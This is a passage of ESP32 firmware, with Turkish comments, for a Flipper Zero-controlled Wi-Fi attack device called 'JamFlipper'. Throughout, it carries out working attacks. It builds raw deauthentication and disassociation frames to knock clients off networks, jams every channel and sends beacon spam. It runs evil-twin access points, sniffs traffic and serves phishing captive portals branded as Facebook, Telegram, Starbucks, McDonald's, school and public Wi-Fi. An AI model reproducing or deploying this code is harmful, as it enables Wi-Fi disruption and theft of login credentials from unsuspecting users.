        g_portal_channel = 6;
        start_captive_portal("Facebook WiFi", 0);
        tx("STATUS:TARGET_FBLOGIN|TargetCH:%d Deauth→%02X:%02X Portal:Facebook WiFi",
           g_evil_channel, g_evil_bssid[4], g_evil_bssid[5]);

    // ── CMD:TTGLOGIN — Target Telegram (deauth + TGM portal) ────
    } else if(strncmp(cmd, "CMD:TTGLOGIN", 12) == 0) {
        memset(g_evil_ssid,  0, sizeof(g_evil_ssid));
        memset(g_evil_bssid, 0, sizeof(g_evil_bssid));
        g_evil_channel = 6;
        g_clone_mac = false;
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        const char* ch = strstr(cmd, "CH:"); if(ch) sscanf(ch, "CH:%hhu", &g_evil_channel);
        const char* bs = strstr(cmd, "BSSID:");
        if(bs) { bs += 6; unsigned int m[6]={0}; if(sscanf(bs,"%02X:%02X:%02X:%02X:%02X:%02X",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6) for(int i=0;i<6;i++) g_evil_bssid[i]=(uint8_t)m[i]; }
        if(g_running) stop_all();
        esp_wifi_set_mac(WIFI_IF_AP, g_factory_ap_mac);
        g_mode = MODE_TARGET_TGM_LOGIN;
        g_running = true;
        g_deauth_count = 0;
        g_last_hop = g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal("Telegram WiFi", 0);
        tx("STATUS:TARGET_TGMLOGIN|TargetCH:%d Deauth→%02X:%02X Portal:Telegram WiFi",
           g_evil_channel, g_evil_bssid[4], g_evil_bssid[5]);

    // ── CMD:TSBLOGIN — Target Starbucks (deauth + SB portal) ────
    } else if(strncmp(cmd, "CMD:TSBLOGIN", 12) == 0) {
        memset(g_evil_ssid,  0, sizeof(g_evil_ssid));
        memset(g_evil_bssid, 0, sizeof(g_evil_bssid));
        g_evil_channel = 6;
        g_clone_mac = false;
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        const char* ch = strstr(cmd, "CH:"); if(ch) sscanf(ch, "CH:%hhu", &g_evil_channel);
        const char* bs = strstr(cmd, "BSSID:");
        if(bs) { bs += 6; unsigned int m[6]={0}; if(sscanf(bs,"%02X:%02X:%02X:%02X:%02X:%02X",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6) for(int i=0;i<6;i++) g_evil_bssid[i]=(uint8_t)m[i]; }
        if(g_running) stop_all();
        esp_wifi_set_mac(WIFI_IF_AP, g_factory_ap_mac);
        g_mode = MODE_TARGET_SB_LOGIN;
        g_running = true;
        g_deauth_count = 0;
        g_last_hop = g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal("Starbucks", 0);
        tx("STATUS:TARGET_SBLOGIN|TargetCH:%d Deauth→%02X:%02X Portal:Starbucks",
           g_evil_channel, g_evil_bssid[4], g_evil_bssid[5]);

    // ── CMD:TMCLOGIN — Target McDonald's (deauth + MC portal) ───
    } else if(strncmp(cmd, "CMD:TMCLOGIN", 12) == 0) {
        memset(g_evil_ssid,  0, sizeof(g_evil_ssid));
        memset(g_evil_bssid, 0, sizeof(g_evil_bssid));
        g_evil_channel = 6;
        g_clone_mac = false;
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        const char* ch = strstr(cmd, "CH:"); if(ch) sscanf(ch, "CH:%hhu", &g_evil_channel);
        const char* bs = strstr(cmd, "BSSID:");
        if(bs) { bs += 6; unsigned int m[6]={0}; if(sscanf(bs,"%02X:%02X:%02X:%02X:%02X:%02X",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6) for(int i=0;i<6;i++) g_evil_bssid[i]=(uint8_t)m[i]; }
        if(g_running) stop_all();
        esp_wifi_set_mac(WIFI_IF_AP, g_factory_ap_mac);
        g_mode = MODE_TARGET_MC_LOGIN;
        g_running = true;
        g_deauth_count = 0;
        g_last_hop = g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal("McDonald's Free WiFi", 0);
        tx("STATUS:TARGET_MCLOGIN|TargetCH:%d Deauth→%02X:%02X Portal:McDonalds",
           g_evil_channel, g_evil_bssid[4], g_evil_bssid[5]);

    // ── CMD:TPUBLOGIN — Target Public WiFi (deauth + PUB portal) 
    } else if(strncmp(cmd, "CMD:TPUBLOGIN", 13) == 0) {
        memset(g_evil_ssid,  0, sizeof(g_evil_ssid));
        memset(g_evil_bssid, 0, sizeof(g_evil_bssid));
        g_evil_channel = 6;
        g_clone_mac = false;
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        const char* ch = strstr(cmd, "CH:"); if(ch) sscanf(ch, "CH:%hhu", &g_evil_channel);
        const char* bs = strstr(cmd, "BSSID:");
        if(bs) { bs += 6; unsigned int m[6]={0}; if(sscanf(bs,"%02X:%02X:%02X:%02X:%02X:%02X",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6) for(int i=0;i<6;i++) g_evil_bssid[i]=(uint8_t)m[i]; }
        if(g_running) stop_all();
        esp_wifi_set_mac(WIFI_IF_AP, g_factory_ap_mac);
        g_mode = MODE_TARGET_PUB_LOGIN;
        g_running = true;
        g_deauth_count = 0;
        g_last_hop = g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal("Free Public WiFi", 0);
        tx("STATUS:TARGET_PUBLOGIN|TargetCH:%d Deauth→%02X:%02X Portal:FreePublicWiFi",
           g_evil_channel, g_evil_bssid[4], g_evil_bssid[5]);

    // ── CMD:TSCHLOGIN — Target School WiFi (deauth + SCH portal)
    } else if(strncmp(cmd, "CMD:TSCHLOGIN", 13) == 0) {
        memset(g_evil_ssid,  0, sizeof(g_evil_ssid));
        memset(g_evil_bssid, 0, sizeof(g_evil_bssid));
        g_evil_channel = 6;
        g_clone_mac = false;
        const char* s = strstr(cmd, "SSID:");
        if(s) { s += 5; int i = 0; while(*s && *s != ',' && i < 32) g_evil_ssid[i++] = *s++; }
        const char* ch = strstr(cmd, "CH:"); if(ch) sscanf(ch, "CH:%hhu", &g_evil_channel);
        const char* bs = strstr(cmd, "BSSID:");
        if(bs) { bs += 6; unsigned int m[6]={0}; if(sscanf(bs,"%02X:%02X:%02X:%02X:%02X:%02X",&m[0],&m[1],&m[2],&m[3],&m[4],&m[5])==6) for(int i=0;i<6;i++) g_evil_bssid[i]=(uint8_t)m[i]; }
        if(g_running) stop_all();
        esp_wifi_set_mac(WIFI_IF_AP, g_factory_ap_mac);
        g_mode = MODE_TARGET_SCH_LOGIN;
        g_running = true;
        g_deauth_count = 0;
        g_last_hop = g_last_status = millis();
        g_portal_channel = 6;
        start_captive_portal("School_Guest", 0);
        tx("STATUS:TARGET_SCHLOGIN|TargetCH:%d Deauth→%02X:%02X Portal:School_Guest",
           g_evil_channel, g_evil_bssid[4], g_evil_bssid[5]);

    } else {
        tx("LOG:Unknown command: %s", cmd);
    }
}

// ─── Kanal Atla ───────────────────────────────────────────────
static void hop_channel(void) {
    g_current_ch = (g_current_ch % 13) + 1;
    esp_wifi_set_channel(g_current_ch, WIFI_SECOND_CHAN_NONE);
}

// ─── Hedefli Kanal Atla (Sadece seçili AP'lerin kanalları) ────
static void hop_channel_targeted(void) {
    bool channels[14] = {false};
    bool any_selected = false;
    
    // Seçili AP'lerin kanallarını işaretle
    for(int i = 0; i < g_ap_count; i++) {
        if(g_aps[i].selected) {
            int ch = g_aps[i].channel;
            if(ch >= 1 && ch <= 13) {
                channels[ch] = true;
                any_selected = true;
            }
        }
    }
    
    // Hiç seçili hedef yoksa normal şekilde devam et
    if(!any_selected) {
        hop_channel();
        return;
    }
    
    // Şu anki kanaldan sonraki ilk aktif kanalı bul
    int next_ch = g_current_ch;
    for(int i = 0; i < 13; i++) {
        next_ch = (next_ch % 13) + 1;
        if(channels[next_ch]) break;
    }
    
    g_current_ch = next_ch;
    esp_wifi_set_channel(g_current_ch, WIFI_SECOND_CHAN_NONE);
}

// ─── Setup ───────────────────────────────────────────────────
void setup() {
    // USB Serial Monitor (test için - her zaman açık)
    Serial.begin(115200);
    delay(500);

    // Flipper ile UART haberleşmesi için Serial1 (GPIO pin 17/18)
    Serial1.begin(UART_BAUD, SERIAL_8N1, FLIPPER_RX_PIN, FLIPPER_TX_PIN);

    // Wi-Fi'yi STA modunda başlat (Arduino API)
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    // Fabrika AP MAC adresini kaydet (Evil Twin CLONE=No için)
    // AP MAC almak için AP moduna geçip tekrar STA'ya dön
    WiFi.mode(WIFI_AP);
    esp_wifi_get_mac(WIFI_IF_AP, g_factory_ap_mac);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);

    delay(300);
    tx("STATUS:BOOT|JamFlipper Ready");
}

// ─── Yardımcı: Byte işleme ────────────────────────────────────
static void process_serial_byte(char c) {
    if(c == '\n' || c == '\r') {
        if(g_cmd_idx > 0) {
            g_cmd_buf[g_cmd_idx] = '\0';
            parse_and_execute(g_cmd_buf);
            g_cmd_idx = 0;
        }
    } else if(g_cmd_idx < CMD_BUF_SIZE - 1) {
        g_cmd_buf[g_cmd_idx++] = c;
    }
}

// ─── Ana Döngü ────────────────────────────────────────────────
void loop() {
    // Flipper UART'tan komut oku
    while(Serial1.available()) {
        process_serial_byte((char)Serial1.read());
    }
    // USB Serial Monitor'dan komut oku (test için)
    while(Serial.available()) {
        process_serial_byte((char)Serial.read());
    }

    if(!g_running) return;

    uint32_t now = millis();

    // ── Tarama Modu: Kanal Hop ────────────────────────────────
    if(g_mode == MODE_SCAN) {
        if(now - g_last_hop > 200) { // Her 200ms'de bir kanal değiştir
            hop_channel();
            g_last_hop = now;
        }
        // Scan durumunu periyodik bildir
        if(now - g_last_status > 2000) {
            tx("STATUS:SCANNING|Found:%d APs", g_ap_count);
            g_last_status = now;
        }
    }

    // ── WiFi Jam Modu ─────────────────────────────────────────
    else if(g_mode == MODE_WIFI_JAM) {
        // Kanal hop
        if(now - g_last_hop > hop_to_ms()) {
            hop_channel();
            g_last_hop = now;
        }

        // Mevcut kanalda bilinen tüm AP'lere deauth gönder
        for(int i = 0; i < g_ap_count; i++) {
            if(g_aps[i].channel == g_current_ch) {
                send_deauth(&g_aps[i], true);
            }
        }

        // Hiç AP yoksa random gerçekçi MAC ile blind deauth gönder
        if(g_ap_count == 0) {
            uint8_t blind_bssid[6];
            blind_bssid[0] = (uint8_t)(esp_random() & 0xFE); // Unicast
            blind_bssid[1] = (uint8_t)esp_random();
            blind_bssid[2] = (uint8_t)esp_random();
            blind_bssid[3] = (uint8_t)esp_random();
            blind_bssid[4] = (uint8_t)esp_random();
            blind_bssid[5] = (uint8_t)esp_random();
            APRecord blind = {};
            memcpy(blind.bssid, blind_bssid, 6);
            blind.channel = g_current_ch;
            blind.client_count = 0;
            send_deauth(&blind, true);
        }

        // Periyodik durum raporu
        if(now - g_last_status > 1000) {
            tx("STATUS:WIFI_JAM|Deauth:%lu CH:%d TX_OK:%lu ERR:%lu",
               (unsigned long)g_deauth_count, g_current_ch,
               (unsigned long)g_tx_ok_count, (unsigned long)g_tx_err_count);
            g_last_status = now;
        }
    }

    // ── Beacon Spam Modu ──────────────────────────────────────
    else if(g_mode == MODE_BEACON_SPAM) {
        // Portal aktifken kanal hoplama (sabit kal)
        if(g_portal_active) {
            if(g_current_ch != g_portal_channel) {
                g_current_ch = g_portal_channel;
                esp_wifi_set_channel(g_current_ch, WIFI_SECOND_CHAN_NONE);
            }
            // DNS/HTTP işle — ÖNCE beacon'dan
            portal_process();
        } else {
            // kanal hop (daha yavaş)
            if(now - g_last_hop > 500) {
                hop_channel();
                g_last_hop = now;
            }
        }

        // Beacon gönder
        char ssid[33];
        get_beacon_ssid(ssid, sizeof(ssid));
        build_and_send_beacon(ssid);

        // Portal aktifken WiFi stack'e zaman ver + tekrar DNS/HTTP işle
        if(g_portal_active) {
            delay(2); // WiFi stack'e işlem zamanı
            portal_process();
        } else {
            delay(5);
        }

        // Periyodik durum raporu
        if(now - g_last_status > 1000) {
            if(g_portal_active) {
                tx("STATUS:BEACON_SPAM|B:%lu CH:%d Portal:%lu",
                   (unsigned long)g_beacon_count, g_current_ch,
                   (unsigned long)g_portal_clients);
            } else {
                tx("STATUS:BEACON_SPAM|Count:%lu CH:%d",
                   (unsigned long)g_beacon_count, g_current_ch);
            }
            g_last_status = now;
        }
    }

    // ── Complete Jam Modu (Deauth + Beacon Spam + Portal) ───────
    else if(g_mode == MODE_COMPLETE_JAM) {

        if(g_portal_active) {
            // ── PORTAL AKTİF: Duty-cycle kanal yönetimi ──
            // Ana zaman portal kanalında DNS/HTTP servisi
            // Periyodik olarak diğer kanallara hop → deauth → geri dön

            // 1) Portal kanalında DNS/HTTP servis et
            if(g_current_ch != g_portal_channel) {
                g_current_ch = g_portal_channel;
                esp_wifi_set_channel(g_current_ch, WIFI_SECOND_CHAN_NONE);
            }
            portal_process();

            // 2) Hop zamanı geldi mi? → kısa süreliğine başka kanala git, deauth gönder
            if(now - g_last_hop > hop_to_ms()) {
                static uint8_t s_cjam_hop = 1;

                // Kanal hesapla (1-13 döngüsü)
                s_cjam_hop++;
                if(s_cjam_hop > 13) s_cjam_hop = 1;
                
                // Portal kanalını atla (orada zaten deauth yapılıyor)
                if(s_cjam_hop == g_portal_channel) {
                    s_cjam_hop++;
                    if(s_cjam_hop > 13) s_cjam_hop = 1;
                }

                // Hedef kanala geç
                esp_wifi_set_channel(s_cjam_hop, WIFI_SECOND_CHAN_NONE);
                delayMicroseconds(500);

                // Bu kanaldaki AP'lere deauth gönder
                for(int i = 0; i < g_ap_count; i++) {
                    if(g_aps[i].channel == s_cjam_hop) {
                        send_deauth(&g_aps[i], true);
                    }
                }

                // RADYO KARTI İÇİN KRİTİK ZAMAN: Deauth paketlerinin fiziksel olarak havaya 
                // iletilmesi(TX) için donanıma süre tanı. Eğer anında portala dönersek paketler iptal olur!
                delay(15);

                // Portal kanalına geri dön
                esp_wifi_set_channel(g_portal_channel, WIFI_SECOND_CHAN_NONE);
                g_current_ch = g_portal_channel;
                g_last_hop = now;
            }

            // 3) Portal kanalındaki AP'lere de deauth gönder
            for(int i = 0; i < g_ap_count; i++) {
                if(g_aps[i].channel == g_portal_channel) {
                    send_deauth(&g_aps[i], true);
                }
            }

            // 4) DNS/HTTP tekrar servis et (deauth sonrası)
            portal_process();

        } else {
            // ── PORTAL KAPALI: Normal kanal hop (WiFi Jam mantığı) ──
            if(now - g_last_hop > hop_to_ms()) {
                hop_channel();
                g_last_hop = now;
            }

            // Tüm kanaldaki AP'lere deauth
            for(int i = 0; i < g_ap_count; i++) {
                if(g_aps[i].channel == g_current_ch) {
                    send_deauth(&g_aps[i], true);
                }
            }
            if(g_ap_count == 0) {
                uint8_t blind_bssid[6];
                blind_bssid[0] = (uint8_t)(esp_random() & 0xFE);
                blind_bssid[1] = (uint8_t)esp_random();
                blind_bssid[2] = (uint8_t)esp_random();
                blind_bssid[3] = (uint8_t)esp_random();
                blind_bssid[4] = (uint8_t)esp_random();
                blind_bssid[5] = (uint8_t)esp_random();
                APRecord blind = {};
                memcpy(blind.bssid, blind_bssid, 6);
                blind.channel = g_current_ch;
                blind.client_count = 0;
                send_deauth(&blind, true);
            }
        }

        // Beacon spam (her iki durumda da)
        char ssid[33];
        get_beacon_ssid(ssid, sizeof(ssid));
        build_and_send_beacon(ssid);

        // Portal aktifken WiFi stack'e zaman ver
        if(g_portal_active) {
            delay(2);
            portal_process();
        } else {
            delay(3);
        }

        // Periyodik durum raporu
        if(now - g_last_status > 1000) {
            if(g_portal_active) {
                tx("STATUS:COMPLETE_JAM|D:%lu B:%lu CH:%d Portal:%lu",
                   (unsigned long)g_deauth_count,
                   (unsigned long)g_beacon_count,
                   g_current_ch,
                   (unsigned long)g_portal_clients);
            } else {
                tx("STATUS:COMPLETE_JAM|D:%lu B:%lu CH:%d TX:%lu E:%lu",
                   (unsigned long)g_deauth_count,
                   (unsigned long)g_beacon_count,
                   g_current_ch,
                   (unsigned long)g_tx_ok_count,
                   (unsigned long)g_tx_err_count);
            }
            g_last_status = now;
        }
    }

    // ── Listed Deauth Modu (Sadece Seçili AP'ler) ──────────────
    else if(g_mode == MODE_LISTED_DEAUTH) {
        // Sadece hedeflerin bulunduğu kanallarda hopla
        if(now - g_last_hop > hop_to_ms()) {
            hop_channel_targeted();
            g_last_hop = now;
        }

        // Sadece SEÇİLİ AP'lere deauth gönder
        for(int i = 0; i < g_ap_count; i++) {
            if(g_aps[i].selected && g_aps[i].channel == g_current_ch) {
                send_deauth(&g_aps[i], false);
            }
        }

        // Periyodik durum raporu
        if(now - g_last_status > 1000) {
            // Seçili hedef sayısını hesapla
            int sel = 0;
            for(int i = 0; i < g_ap_count; i++) {
                if(g_aps[i].selected) sel++;
            }
            tx("STATUS:LISTED_DEAUTH|Deauth:%lu Sel:%d CH:%d TX_OK:%lu ERR:%lu",
               (unsigned long)g_deauth_count, sel, g_current_ch,
               (unsigned long)g_tx_ok_count, (unsigned long)g_tx_err_count);
            g_last_status = now;
        }
    }

    // ── Captive Portal Modu (Standalone) ──────────────────────────
    else if(g_mode == MODE_CAPTIVE_PORTAL) {
        if(g_portal_active) {
            portal_process();
        }

        if(now - g_last_status > 2000) {
            tx("STATUS:PORTAL|SSID:%s Clients:%lu Page:%d",
               g_portal_ssid, (unsigned long)g_portal_clients,
               g_portal_type);
            g_last_status = now;
        }
    }

    // ── Sniff Modu (MODE_SNIFF / MODE_TARGET_SNIFF) ────────────────
    else if(g_mode == MODE_SNIFF || g_mode == MODE_TARGET_SNIFF) {
        // Bağlantı bekleniyor mu?
        if(!g_sniff_connected) {
            wl_status_t wl = WiFi.status();
            if(wl == WL_CONNECTED) {
                g_sniff_connected = true;
                g_current_ch = WiFi.channel();
                // Bağlantı kuruldu → promiscuous modu başlat
                esp_wifi_set_promiscuous(true);
                esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);
                tx("STATUS:%s|Connected CH:%d IP:%s",
                   (g_mode == MODE_SNIFF) ? "SNIFF" : "TARGET_SNIFF",
                   g_current_ch, WiFi.localIP().toString().c_str());
            } else if(wl == WL_CONNECT_FAILED || wl == WL_NO_SSID_AVAIL) {
                tx("LOG:Connection failed! Check SSID/Pass");
                stop_all();
            } else if(now - g_last_status > 3000) {
                tx("STATUS:%s|Connecting...",
                   (g_mode == MODE_SNIFF) ? "SNIFF" : "TARGET_SNIFF");
                g_last_status = now;
            }
        } else {
            // Periyodik durum bildirimi
            if(now - g_last_status > 2000) {
                if(g_mode == MODE_SNIFF) {
                    tx("STATUS:SNIFF|Pkts:%lu Sent:%lu CH:%d SSID:%s",
                       (unsigned long)g_sniff_pkt_count,
                       (unsigned long)g_sniff_sent_count,
                       g_current_ch, g_sniff_ssid);
                } else {
                    char fmac[18];
                    snprintf(fmac, sizeof(fmac), "%02X:%02X:%02X:%02X:%02X:%02X",
                             g_target_mac[0],g_target_mac[1],g_target_mac[2],
                             g_target_mac[3],g_target_mac[4],g_target_mac[5]);
                    tx("STATUS:TARGET_SNIFF|Pkts:%lu Sent:%lu MAC:%s",
                       (unsigned long)g_sniff_pkt_count,
                       (unsigned long)g_sniff_sent_count, fmac);
                }
                g_last_status = now;
            }
        }
    }

    // ── Evil Twin Modu ─────────────────────────────────────────────
    else if(g_mode == MODE_EVIL_TWIN) {
        if(g_portal_active) portal_process();

        wifi_sta_list_t sta_list;
        esp_wifi_ap_get_sta_list(&sta_list);

        // Zaman dilimli deauth: 600ms → hedef kanalında deauth, 400ms → portal kanalına geri dön
        // Evil Twin'de portal kanalı = hedef kanalı, ama send_deauth aynı kanalı değiştiriyordu
        // Artık doğrudan esp_wifi_80211_tx kullanıyoruz — kanal gerektiğinde set edilip geri alınıyor
        static uint32_t s_et_phase_start = 0;
        static bool     s_et_in_deauth   = false;

        if(sta_list.num == 0) {
            if(!s_et_in_deauth && (now - s_et_phase_start > 400)) {
                s_et_in_deauth   = true;
                s_et_phase_start = now;
            }
            if(s_et_in_deauth) {
                if(now - s_et_phase_start < 600) {
                    // Evil Twin: portal ve hedef aynı kanalda — kanal değiştirmemize gerek yok
                    uint8_t frame[26] = {
                        0xC0, 0x00, 0x3A, 0x01,
                        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x07, 0x00
                    };
                    memcpy(frame + 10, g_evil_bssid, 6);
                    memcpy(frame + 16, g_evil_bssid, 6);
                    uint16_t seq = ((g_deauth_count & 0x0FFF) << 4);
                    frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
                    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
                    g_deauth_count++;
                    frame[0] = 0xA0; // Disassoc
                    seq = ((g_deauth_count & 0x0FFF) << 4);
                    frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
                    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
                    g_deauth_count++;
                    delayMicroseconds(500);
                } else {
                    s_et_in_deauth   = false;
                    s_et_phase_start = now;
                }
            }
        } else {
            s_et_in_deauth   = false;
            s_et_phase_start = now;
        }

        if(now - g_last_status > 2000) {
            tx("STATUS:EVIL_TWIN|Deauth:%lu Portal:%lu SSID:%s STA:%d Phase:%s",
               (unsigned long)g_deauth_count, (unsigned long)g_portal_clients,
               g_portal_ssid, sta_list.num, s_et_in_deauth ? "DEAUTH" : "PORTAL");
            g_last_status = now;
        }
    }

    // ── G-Login Beacon Modu ────────────────────────────────────────
    else if(g_mode == MODE_G_LOGIN) {
        if(g_portal_active) portal_process();

        wifi_sta_list_t sta_list;
        esp_wifi_ap_get_sta_list(&sta_list);

        if(now - g_last_status > 2000) {
            tx("STATUS:G_LOGIN|Clients:%lu SSID:%s STA:%d",
               (unsigned long)g_portal_clients, g_portal_ssid, sta_list.num);
            g_last_status = now;
        }
    }

    // ── Targeted G-Login Modu (Deauth burst + G-Login Portal) ─────────
    else if(g_mode == MODE_TARGET_G_LOGIN) {
        if(g_portal_active) portal_process();

        wifi_sta_list_t sta_list;
        esp_wifi_ap_get_sta_list(&sta_list);

        // Zaman dilimli deauth: 600ms deauth, 400ms dinlenme
        static uint32_t s_tgl_phase_start = 0;
        static bool     s_tgl_in_deauth   = false;

        if(sta_list.num == 0) {
            if(!s_tgl_in_deauth && (now - s_tgl_phase_start > 400)) {
                s_tgl_in_deauth   = true;
                s_tgl_phase_start = now;
            }
            if(s_tgl_in_deauth) {
                if(now - s_tgl_phase_start < 600) {
                    uint8_t frame[26] = {
                        0xC0, 0x00, 0x3A, 0x01,
                        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x07, 0x00
                    };
                    memcpy(frame + 10, g_evil_bssid, 6);
                    memcpy(frame + 16, g_evil_bssid, 6);
                    uint16_t seq = ((g_deauth_count & 0x0FFF) << 4);
                    frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
                    send_raw_frame(frame, sizeof(frame), false);
                    g_deauth_count++;
                    frame[0] = 0xA0; // Disassoc
                    seq = ((g_deauth_count & 0x0FFF) << 4);
                    frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
                    send_raw_frame(frame, sizeof(frame), false);
                    g_deauth_count++;
                    delayMicroseconds(800);
                } else {
                    s_tgl_in_deauth   = false;
                    s_tgl_phase_start = now;
                }
            }
        } else {
            s_tgl_in_deauth   = false;
            s_tgl_phase_start = now;
        }

        if(now - g_last_status > 2000) {
            tx("STATUS:TARGET_GLOGIN|Deauth:%lu Portal:%lu SSID:%s STA:%d Phase:%s",
               (unsigned long)g_deauth_count,
               (unsigned long)g_portal_clients,
               g_portal_ssid, sta_list.num,
               s_tgl_in_deauth ? "DEAUTH" : "PORTAL");
            g_last_status = now;
        }
    }

    // ── Beacon Modes: IG / FB / TGM / SB / MC / PUB / SCH ─────────
    // Hepsi aynı mantık: portal_process + periyodik STATUS
    else if(g_mode == MODE_IG_LOGIN  || g_mode == MODE_FB_LOGIN  ||
            g_mode == MODE_TGM_LOGIN || g_mode == MODE_SB_LOGIN  ||
            g_mode == MODE_MC_LOGIN  || g_mode == MODE_PUB_LOGIN ||
            g_mode == MODE_SCH_LOGIN) {

        if(g_portal_active) portal_process();

        wifi_sta_list_t sta;
        esp_wifi_ap_get_sta_list(&sta);

        if(now - g_last_status > 2000) {
            const char* tag =
                (g_mode == MODE_IG_LOGIN)  ? "IG_LOGIN"  :
                (g_mode == MODE_FB_LOGIN)  ? "FB_LOGIN"  :
                (g_mode == MODE_TGM_LOGIN) ? "TGM_LOGIN" :
                (g_mode == MODE_SB_LOGIN)  ? "SB_LOGIN"  :
                (g_mode == MODE_MC_LOGIN)  ? "MC_LOGIN"  :
                (g_mode == MODE_PUB_LOGIN) ? "PUB_LOGIN" : "SCH_LOGIN";
            tx("STATUS:%s|Clients:%lu SSID:%s STA:%d",
               tag, (unsigned long)g_portal_clients, g_portal_ssid, sta.num);
            g_last_status = now;
        }
    }

    // ── Targeted Modes: T-IG / T-FB / T-TGM / T-SB / T-MC / T-PUB / T-SCH ──
    // Zaman dilimli: 600ms deauth burst → 400ms portal nefesi, döngü devam eder.
    // Kanal portal AP'nin kanalına sabit — deauth zaten aynı kanalda.
    else if(g_mode == MODE_TARGET_IG_LOGIN  || g_mode == MODE_TARGET_FB_LOGIN  ||
            g_mode == MODE_TARGET_TGM_LOGIN || g_mode == MODE_TARGET_SB_LOGIN  ||
            g_mode == MODE_TARGET_MC_LOGIN  || g_mode == MODE_TARGET_PUB_LOGIN ||
            g_mode == MODE_TARGET_SCH_LOGIN) {

        // Portal her tick'te işle — beacon frame'leri softAP tarafından arka planda zaten gönderiliyor
        if(g_portal_active) portal_process();

        wifi_sta_list_t sta;
        esp_wifi_ap_get_sta_list(&sta);

        // Bağlı cihaz yoksa hedefi düşür: kanal hop + burst + kanal geri al
        // 600ms deauth penceresi, 400ms portal dinlenmesi
        static uint32_t s_deauth_phase_start = 0;
        static bool     s_in_deauth_phase    = false;

        if(sta.num == 0) {
            if(!s_in_deauth_phase && (now - s_deauth_phase_start > 400)) {
                s_in_deauth_phase    = true;
                s_deauth_phase_start = now;
            }

            if(s_in_deauth_phase) {
                if(now - s_deauth_phase_start < 600) {
                    // Kısa süreliğine hedef kanalına geç, deauth at, portal kanalına geri dön
                    esp_wifi_set_channel(g_evil_channel, WIFI_SECOND_CHAN_NONE);
                    uint8_t frame[26] = {
                        0xC0, 0x00, 0x3A, 0x01,
                        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA = broadcast
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA = hedef AP BSSID
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
                        0x00, 0x00,                           // Seq
                        0x07, 0x00                            // Reason: Class 3 frame
                    };
                    memcpy(frame + 10, g_evil_bssid, 6);
                    memcpy(frame + 16, g_evil_bssid, 6);
                    uint16_t seq = ((g_deauth_count & 0x0FFF) << 4);
                    frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
                    // Deauth (AP→Broadcast): hedefi ağdan düşür
                    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
                    g_deauth_count++;
                    // Disassoc (AP→Broadcast)
                    frame[0] = 0xA0;
                    seq = ((g_deauth_count & 0x0FFF) << 4);
                    frame[22] = seq & 0xFF; frame[23] = (seq >> 8) & 0xFF;
                    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
                    g_deauth_count++;
                    // Portal kanalına geri dön — SoftAP beacon'ları yeniden devreye girer
                    esp_wifi_set_channel(g_portal_channel, WIFI_SECOND_CHAN_NONE);
                    delayMicroseconds(500);
                } else {
                    s_in_deauth_phase    = false;
                    s_deauth_phase_start = now;
                }
            }
        } else {
            // Cihaz bağlandı — deauth duraksın, portal'a teslim ol
            s_in_deauth_phase    = false;
            s_deauth_phase_start = now;
        }

        if(now - g_last_status > 2000) {
            const char* tag =
                (g_mode == MODE_TARGET_IG_LOGIN)  ? "TARGET_IGLOGIN"  :
                (g_mode == MODE_TARGET_FB_LOGIN)  ? "TARGET_FBLOGIN"  :
                (g_mode == MODE_TARGET_TGM_LOGIN) ? "TARGET_TGMLOGIN" :
                (g_mode == MODE_TARGET_SB_LOGIN)  ? "TARGET_SBLOGIN"  :
                (g_mode == MODE_TARGET_MC_LOGIN)  ? "TARGET_MCLOGIN"  :
                (g_mode == MODE_TARGET_PUB_LOGIN) ? "TARGET_PUBLOGIN" : "TARGET_SCHLOGIN";
            tx("STATUS:%s|Deauth:%lu Portal:%lu SSID:%s STA:%d Phase:%s",
               tag, (unsigned long)g_deauth_count,
               (unsigned long)g_portal_clients, g_portal_ssid, sta.num,
               s_in_deauth_phase ? "DEAUTH" : "PORTAL");
            g_last_status = now;
        }
    }
}
